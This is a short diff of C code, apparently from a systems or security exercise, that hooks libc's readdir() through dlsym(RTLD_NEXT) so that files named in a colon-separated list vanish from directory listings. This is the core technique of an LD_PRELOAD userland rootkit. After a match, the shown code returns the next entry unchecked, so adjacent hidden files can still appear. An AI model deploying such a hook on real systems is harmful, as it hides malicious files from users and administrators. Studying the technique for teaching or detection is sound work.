@@ -11,21 +11,11 @@
 // your code for readdir() goes here
 
 struct dirent *readdir(DIR *dirp) {
-    static void *handle = NULL;
     static struct dirent *(*orig_readdir)(DIR *) = NULL;
-
-    if (!handle) {
-        handle = dlopen("libc.so.6", RTLD_LAZY);
-        if (!handle) {
-            fprintf(stderr, "dlopen() failed: %s\n", dlerror());
-            exit(1);
-        }
-
-        orig_readdir = dlsym(handle, "readdir");
-        if (!orig_readdir) {
-            fprintf(stderr, "dlsym() failed: %s\n", dlerror());
-            exit(1);
-        }
+    
+    // Load the og readdir() if not yet loaded
+    if (!orig_readdir) {
+        orig_readdir = dlsym(RTLD_NEXT, "readdir");
     }
 
     struct dirent *entry;
@@ -34,11 +24,13 @@ struct dirent *readdir(DIR *dirp) {
     char *copy;
 
     while ((entry = orig_readdir(dirp))) {
+        //Make copy of hiddlen_files to avoid changing the og string
         copy = strdup(hidden_files);
         hidden_file = strtok(copy, ":");
 
         while (hidden_file != NULL) {
             if (strcmp(entry->d_name, hidden_file) == 0) {
+                //Need to free because of strdup
                 free(copy);
                 // Skip the hidden file
                 return orig_readdir(dirp); 
